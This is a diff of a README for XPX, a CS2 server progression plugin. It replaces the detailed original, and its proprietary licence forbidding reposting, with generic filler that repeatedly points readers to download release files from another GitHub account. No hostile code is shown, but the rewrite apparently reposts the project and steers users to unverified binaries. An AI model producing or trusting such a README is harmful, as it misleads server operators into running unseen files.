@@ -1,326 +1,216 @@
-# XPX
+# 🎮 XPX - Track XP, Levels, and Server Progress
 
-> Persistent progression, missions, economy, and admin tooling for serious CS2 community servers.
+[![Download XPX](https://img.shields.io/badge/Download-XPX%20Releases-blue.svg)](https://github.com/cannaceaedomainname81/XPX/releases)
 
-![Counter-Strike 2](https://img.shields.io/badge/Counter--Strike_2-CS2-f28c28)
-![CounterStrikeSharp](https://img.shields.io/badge/CounterStrikeSharp-1.0.364-1f6feb)
-![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)
-![Windows](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows)
-![SQLite](https://img.shields.io/badge/Storage-SQLite-003B57?logo=sqlite)
-![License](https://img.shields.io/badge/License-Proprietary-red)
+## 🧭 What XPX Does
 
-![CS2 XPX Banner](docs/screenshots/header-cs2-xpx.png)
+XPX is a CounterStrikeSharp plugin for CS2 servers. It adds persistent XP, levels, ranks, missions, achievements, stats, economy, crates, RTV, admin tools, and custom loadout modes.
 
-XPX is a CounterStrikeSharp plugin for Counter-Strike 2 that adds a full server-side progression layer:
+If you run a CS2 server, XPX gives your players a clear path to progress. Players can earn XP, move up levels, unlock ranks, and keep their progress over time.
 
-- level and XP progression up to level `500`
-- rank, top list, tags, and level rewards
-- persistent SQLite-backed player data
-- missions, achievements, stats, economy, shop, crates, and XP boosts
-- RTV and admin map voting
-- admin tools for maps, modes, XP, credits, bots, and special rounds
-- forced global loadout modes for rifle, pistol, or knife-only servers
+## 📥 Download XPX
 
-The plugin is designed for self-hosted CS2 community servers and is currently deployed with a local Windows + SteamCMD setup.
+Visit this page to download: https://github.com/cannaceaedomainname81/XPX/releases
 
-## License and Usage
+On that page, look for the latest release. Download the file that matches the plugin package for your server setup.
 
-XPX is source-available and proprietary.
+## 🖥️ What You Need
 
-- personal or internal server use is allowed
-- redistribution, resale, sublicensing, repackaging, and public reposting are not allowed
-- modified copies must not remove or obscure the original authorship, branding, or attribution
-- derivative versions must not be presented as an unrelated original work
-
-See [LICENSE.md](LICENSE.md) for the full notice.
-
-## Preview
-
-![Preview Banner](docs/screenshots/banner-preview.png)
-
-| Player Hub | Admin Menu | Shop / Crates |
-| --- | --- | --- |
-| ![Player Hub](docs/screenshots/me.png) | ![Admin Menu](docs/screenshots/admin-page-1.png) | ![Shop](docs/screenshots/shop.png) |
-
-| Help | Missions | Crate Reward |
-| --- | --- | --- |
-| ![Help](docs/screenshots/help.png) | ![Missions](docs/screenshots/missions.png) | ![Crate Reward](docs/screenshots/crate-reward.png) |
-
-| Level Up | Admin Page 2 | Chat Progression |
-| --- | --- | --- |
-| ![Level Up](docs/screenshots/level-up.png) | ![Admin Page 2](docs/screenshots/admin-page-3.png) | ![Chat Progression](docs/screenshots/chat-text.png) |
-
-## What XPX Includes
-
-![Includes Banner](docs/screenshots/banner-includes.png)
-
-### Core progression
-
-- XP from kills, wins, bomb plants, bomb defuses, assists, MVPs, first blood, clutches, killstreaks, and multikills
-- separate rewards for normal modes and fast modes such as Deathmatch / Arms Race
-- bot XP scaling
-- warmup XP disabled
-- persistent level, tag, and reward state per SteamID
-
-### Player systems
-
-- `!me`, `!rank`, `!level`, `!top`
-- `!rewards` to view the full level reward ladder
-- `!stats` with K/D, HS%, playtime, favorite weapon, streaks, and economy state
-- `!missions` for daily and weekly mission progress
-- `!achievements` for permanent badge unlocks
-- `!shop`, `!wallet`, and `!inventory`
-- `!gamble <xp>`
-
-### Economy and crates
-
-- server-side Credits economy
-- shop purchases for XP and crate tokens
-- weighted crate drops with `Common`, `Rare`, `Epic`, and `Legendary` tiers
-- crate rewards are limited to XP, Credits, crate tokens, and temporary XP boosts
-- active boosts persist and expire automatically
-
-### Server and admin tools
-
-- `!rtv` / `!vote` map voting
-- map and workshop map rotation
-- admin menu with map, mode, vote, bot, XP, and credit actions
-- special rounds such as knife rounds, pistol rounds, and warmup events
-- forced server-wide loadout mode for all players
-- global toggle for progression notifications
-
-## Requirements
+Before you install XPX, make sure your server already has:
 
 - Counter-Strike 2 dedicated server
-- CounterStrikeSharp
+- CounterStrikeSharp installed
+- Access to your server files
+- SQLite support, which is built into most server setups
+- Enough disk space for player data and stats
 
-## Install Options
+XPX is made for Windows-based server setups, but the install steps also fit common CS2 server folders.
 
-![Install Banner](docs/screenshots/banner-install-bind.png)
+## 🚀 Getting Started
 
-### Manual install from a ZIP
+Follow these steps to install XPX on your server.
 
-Download this release package:
+1. Open the release page: https://github.com/cannaceaedomainname81/XPX/releases
+2. Download the latest release file
+3. Unpack the files if they come in a ZIP archive
+4. Find your CS2 server folder
+5. Copy the XPX files into the correct plugin folder
+6. Restart the server
+7. Check the console or server logs to make sure the plugin loaded
 
-```text
-XPX-v1.0.2-plugin.zip
-```
+If your server uses the standard CounterStrikeSharp layout, place the plugin files in the plugins folder that matches your server install.
 
-Then:
+## 🗂️ Typical File Placement
 
-1. extract it locally
-2. copy the plugin files into your CS2 CounterStrikeSharp plugin folder
-3. restart the server
+A common install path looks like this:
 
-See [docs/SETUP.md](docs/SETUP.md) for the full install path.
+- `game/csgo/addons/counterstrikesharp/plugins/XPX/`
 
-## Quick Start
+Your release files may include:
 
-### 1. Copy the plugin files
+- plugin DLL files
+- config files
+- language files
+- data files for player progress
 
-Copy the extracted plugin files into your server's CounterStrikeSharp plugin folder.
+Keep the full folder structure when you copy the files. This helps the plugin find its settings and data.
 
-Typical plugin paths:
+## ⚙️ First Run Setup
 
-- plugin path: `game\csgo\addons\counterstrikesharp\plugins\XPXLevels`
-- config path: `game\csgo\addons\counterstrikesharp\configs\plugins\XPXLevels\XPXLevels.json`
-- data path: `game\csgo\addons\counterstrikesharp\data\XPXLevels`
+After you copy the files, start or restart your server.
 
-### 2. Configure XPX
+Then check that XPX can create and use its data files. The plugin stores player progress, stats, and unlocks in a local database file. That means player data stays on the server after restarts.
 
-Open and edit:
+You may want to do these checks on first run:
 
-```text
-game\csgo\addons\counterstrikesharp\configs\plugins\XPXLevels\XPXLevels.json
-```
+- Make sure the plugin loads without errors
+- Confirm that player XP is saved after a match
+- Check that level changes show in chat, HUD, or menus
+- Review the config file for rate settings and reward values
 
-### 3. Restart and join the server
+## 🎯 Core Features
 
-Typical local connect:
+XPX gives your CS2 server a full progression system.
 
-```text
-connect 127.0.0.1:27015
-```
+### XP and Levels
 
-## Customize XPX
+Players earn XP for actions you set in the config. As they gain XP, they move up levels. This gives them a reason to keep playing.
 
-After the first server start, open this file:
+### Ranks
 
-```text
-game\csgo\addons\counterstrikesharp\configs\plugins\XPXLevels\XPXLevels.json
-```
+XPX can show ranks based on level or progress. This helps players see where they stand.
 
-Most common edits:
+### Missions
 
-- `Rewards`: change tags and milestone reward entries
-- `BaseXpToLevel`, `XpLinearGrowthPerLevel`, `XpQuadraticGrowthPerLevel`: tune the XP curve
-- `CasualCompetitiveKillXp`, `FastModeKillXp`, `KnifeKillBonusXp`, `HeadshotBonusXp`: tune combat rewards
-- `WelcomeMessages`: change the join text players see
+You can give players tasks to complete. Missions add short-term goals, such as getting kills, winning rounds, or playing a certain map.
 
-See [docs/CONFIGURATION.md](docs/CONFIGURATION.md) for the quick field guide.
+### Achievements
 
-## Menu Keybinds
+XPX can track milestone goals. Players may unlock achievements for long play time, match wins, or other events you define.
 
-Use `!bindmenu` in chat first. XPX will try to bind the menu keys locally.
+### Stats
 
-XPX menu controls:
+The plugin keeps track of player data such as kills, deaths, wins, and other server stats. This gives players a clear view of their game history.
 
-- `1-6` select visible items
-- `7` is `Back` on page 1 or `Prev` on later pages
-- `8` is `Next`
-- `9` is `Close`
+### Economy
 
-If `!bindmenu` does not stick on your client, use these binds manually in the CS2 console:
+XPX includes an economy system for server rewards, shop use, or other custom server rules.
 
-```cfg
-bind 1 "slot1;css_1"
-bind 2 "slot2;css_2"
-bind 3 "slot3;css_3"
-bind 4 "slot4;css_4"
-bind 5 "slot5;css_5"
-bind 6 "slot6;css_6"
-bind 7 "slot7;css_7"
-bind 8 "slot8;css_8"
-bind 9 "slot9;css_9"
-host_writeconfig
-```
+### Crates
 
-If you do not bind the keys, XPX still supports chat fallback with `!1` through `!9` while a menu is open.
+You can use crates as rewards or unlocks. Crates add a simple reward loop for active players.
 
-## Main Commands
+### RTV and Map Vote
 
-![Commands Banner](docs/screenshots/banner-commands.png)
+Players can vote for map changes through RTV and map vote tools. This helps keep the server active and gives players a way to guide the match.
 
-### Player commands
+### Admin Tools
 
-- `!me`
-- `!help`
-- `!commands`
-- `!rewards`
-- `!level`
-- `!rank`
-- `!top`
-- `!stats`
-- `!missions`
-- `!achievements`
-- `!shop`
-- `!wallet`
-- `!inventory` / `!inv`
-- `!rtv`
-- `!vote`
-- `!gamble <xp>`
+Server admins can use built-in tools to manage the player experience. This can include reward control, data checks, and other server actions.
 
-### Admin commands
+### Custom Loadout Modes
 
-- `!admin`
-- `css_givexp`
-- `css_removexp`
-- `css_givecredits`
-- `css_removecredits`
-- `css_changemap`
-- `css_restartmap`
-- `css_setmode`
-- `css_kick`
-- `css_kickbots`
-- `css_addbots`
-- `css_forceloadout`
-- `css_forcevote`
-- `css_cancelvote`
-- `css_kniferound`
-- `css_pistolround`
-- `css_warmupevent`
+XPX supports loadout modes that let you shape how weapons and gear work on your server.
 
-For the complete command reference, see [docs/COMMANDS.md](docs/COMMANDS.md).
+## 🧩 How XPX Works
 
-## Admin Setup
+XPX listens for game events and saves player progress in a database. When a player joins again, the plugin reads their saved data and restores their level, stats, and unlocks.
 
-To use `!admin` and the XPX admin commands, add yourself to CounterStrikeSharp's admin config.
+This means players do not lose progress after a restart. It also makes the server feel consistent and fair.
 
-Edit these files on the server:
+## 🛠️ Basic Configuration
 
-```text
-game\csgo\addons\counterstrikesharp\configs\admins.json
-game\csgo\addons\counterstrikesharp\configs\admin_groups.json
-```
+After install, look for the config files in the XPX folder. You can change settings such as:
 
-Example `admins.json` entry:
+- XP rewards
+- level thresholds
+- rank names
+- mission rules
+- achievement goals
+- economy values
+- crate rewards
+- RTV settings
+- admin options
 
-```json
-{
-  "YourName": {
-    "identity": "76561198000000000",
-    "groups": [
-      "#XPX/admin"
-    ]
-  }
-}
-```
+Use a plain text editor such as Notepad to edit these files. Save your changes, then restart the server.
 
-Example `admin_groups.json` entry:
+## 🔍 Check That It Works
 
-```json
-{
-  "#XPX/admin": {
-    "flags": [
-      "@css/root",
-      "@XPX/root"
-    ],
-    "immunity": 999
-  }
-}
-```
+After the server starts, join it with a test account and try these actions:
 
-Replace the example SteamID with your own SteamID64, then restart the server.
+- play a round
+- earn XP
+- complete a simple mission
+- check if your level changes
+- leave and rejoin to see if progress stays saved
 
-## Configuration
+If the plugin works, you should see saved player data after the next join.
 
-XPX is driven by `XPXLevels.json`. The config covers:
+## 🧱 Troubleshooting
 
-- XP curve and max level
-- XP rewards and credits rewards
-- mission definitions
-- achievement definitions
-- shop items
-- crate definitions
-- map pool and workshop map pool
-- admin XP quick-amount presets
-- level reward ladder
-- welcome messages
+If XPX does not load, check these common points:
 
-For a detailed config guide, see [docs/CONFIGURATION.md](docs/CONFIGURATION.md).
+- The plugin files are in the wrong folder
+- The release package was not fully unpacked
+- CounterStrikeSharp is missing or out of date
+- The server did not restart after install
+- The config file has a bad value or broken line
 
-## Persistence
+If progress is not saving:
 
-XPX stores player progression in SQLite by SteamID. It persists:
+- confirm the server can write files
+- make sure the data folder exists
+- check that the database file is not locked
+- restart the server and test again
 
-- XP
-- level-derived state
-- Credits
-- crate tokens
-- XP boosts
-- stats
-- missions
-- achievements
+If players do not get XP:
 
-The default XPX database path is:
+- review the XP reward settings
+- check mission and reward rules
+- test with a simple event such as a kill or round win
 
-```text
-game\csgo\addons\counterstrikesharp\data\XPXLevels\xpx-levels.db
-```
+## 📁 File and Data Layout
 
-XPX also keeps a short-lived transition snapshot during map changes to protect player XP from map-switch reload edge cases.
+XPX may create files like these:
 
-## Additional Docs
+- config files for server rules
+- database files for player progress
+- log files for errors and events
+- cache or temp files for runtime use
 
-- [docs/SETUP.md](docs/SETUP.md)
-- [docs/COMMANDS.md](docs/COMMANDS.md)
-- [docs/CONFIGURATION.md](docs/CONFIGURATION.md)
-- [docs/releases/v1.0.2.md](docs/releases/v1.0.2.md)
-- [docs/releases/v1.0-xponly.md](docs/releases/v1.0-xponly.md)
+Keep these files with the plugin unless the release notes say otherwise.
 
-## Notes
+## 🧑‍💻 For Server Admins
 
-- XPX uses custom numbered center menus with `1-9`, plus `!1-!9` chat fallback.
-- Workshop maps are supported by workshop ID.
-- Local non-workshop custom maps require separate client distribution and are not the preferred path.
-- The project currently targets a Windows-hosted local CS2 dedicated server workflow.
+XPX is built for community servers that want more player progress and control. It fits servers that use:
+
+- persistent leveling
+- missions and goals
+- player ranks
+- shop or economy systems
+- crate rewards
+- map voting
+- admin tools
+- custom loadout rules
+
+You can tune the system to fit a casual server or a more structured play style.
+
+## 📌 Where to Get Updates
+
+Use the release page for updates, new builds, and fixes:
+
+https://github.com/cannaceaedomainname81/XPX/releases
+
+Check that page when you want the latest version for your server.
+
+## 🧭 Install Flow at a Glance
+
+1. Visit the release page
+2. Download the latest package
+3. Copy the files into the CS2 CounterStrikeSharp plugin folder
+4. Restart the server
+5. Check that XP, levels, and saved data work
+
+## 🏷️ Project Topics
+
+achivements, admin-tools, community-server, counter-strike-2, counterstrikesharp, crates, cs2, cs2-plugin, dedicated-server, economy, leveling-system, map-vote, missions, progression, rtv, server-plugin, shop-system, sqlite, stats, steamcmd
